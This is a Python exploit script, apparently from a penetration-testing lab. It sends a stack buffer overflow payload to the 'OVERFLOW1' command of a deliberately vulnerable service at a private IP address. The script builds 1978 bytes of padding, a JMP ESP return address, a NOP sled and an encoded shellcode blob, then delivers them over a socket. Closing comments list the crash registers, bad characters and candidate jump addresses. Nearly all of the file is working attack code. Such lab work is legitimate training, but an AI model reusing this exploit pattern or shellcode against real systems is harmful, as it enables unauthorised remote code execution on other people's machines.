import socket
import time


# Fuzzing shows crash at 2000 bytes input

host = "10.10.5.232"
port = 1337

offset = 1978
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")
nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)
shell_code = (
    b"\xb8\xa7\xa2\x32\x36\xda\xc5\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
    b"\x53\x31\x43\x12\x03\x43\x12\x83\x64\xa6\xd0\xc3\x96\x4f\x96"
    b"\x2c\x66\x90\xf7\xa5\x83\xa1\x37\xd1\xc0\x92\x87\x91\x84\x1e"
    b"\x63\xf7\x3c\x94\x01\xd0\x33\x1d\xaf\x06\x7a\x9e\x9c\x7b\x1d"
    b"\x1c\xdf\xaf\xfd\x1d\x10\xa2\xfc\x5a\x4d\x4f\xac\x33\x19\xe2"
    b"\x40\x37\x57\x3f\xeb\x0b\x79\x47\x08\xdb\x78\x66\x9f\x57\x23"
    b"\xa8\x1e\xbb\x5f\xe1\x38\xd8\x5a\xbb\xb3\x2a\x10\x3a\x15\x63"
    b"\xd9\x91\x58\x4b\x28\xeb\x9d\x6c\xd3\x9e\xd7\x8e\x6e\x99\x2c"
    b"\xec\xb4\x2c\xb6\x56\x3e\x96\x12\x66\x93\x41\xd1\x64\x58\x05"
    b"\xbd\x68\x5f\xca\xb6\x95\xd4\xed\x18\x1c\xae\xc9\xbc\x44\x74"
    b"\x73\xe5\x20\xdb\x8c\xf5\x8a\x84\x28\x7e\x26\xd0\x40\xdd\x2f"
    b"\x15\x69\xdd\xaf\x31\xfa\xae\x9d\x9e\x50\x38\xae\x57\x7f\xbf"
    b"\xd1\x4d\xc7\x2f\x2c\x6e\x38\x66\xeb\x3a\x68\x10\xda\x42\xe3"
    b"\xe0\xe3\x96\x9e\xe8\x42\x49\xbd\x15\x34\x39\x01\xb5\xdd\x53"
    b"\x8e\xea\xfe\x5b\x44\x83\x97\xa1\x67\xba\x3b\x2f\x81\xd6\xd3"
    b"\x79\x19\x4e\x16\x5e\x92\xe9\x69\xb4\x8a\x9d\x22\xde\x0d\xa2"
    b"\xb2\xf4\x39\x34\x39\x1b\xfe\x25\x3e\x36\x56\x32\xa9\xcc\x37"
    b"\x71\x4b\xd0\x1d\xe1\xe8\x43\xfa\xf1\x67\x78\x55\xa6\x20\x4e"
    b"\xac\x22\xdd\xe9\x06\x50\x1c\x6f\x60\xd0\xfb\x4c\x6f\xd9\x8e"
    b"\xe9\x4b\xc9\x56\xf1\xd7\xbd\x06\xa4\x81\x6b\xe1\x1e\x60\xc5"
    b"\xbb\xcd\x2a\x81\x3a\x3e\xed\xd7\x42\x6b\x9b\x37\xf2\xc2\xda"
    b"\x48\x3b\x83\xea\x31\x21\x33\x14\xe8\xe1\x43\x5f\xb0\x40\xcc"
    b"\x06\x21\xd1\x91\xb8\x9c\x16\xac\x3a\x14\xe7\x4b\x22\x5d\xe2"
    b"\x10\xe4\x8e\x9e\x09\x81\xb0\x0d\x29\x80"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW1 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 6F43396E
# ESP at crash: 0197FA30 -> 316F4330

# EIP Pattern Offset: 1978
# ESP (0x0197fa30) points at offset 1982 in pattern 

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x07, 0x2e, 0xa0

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
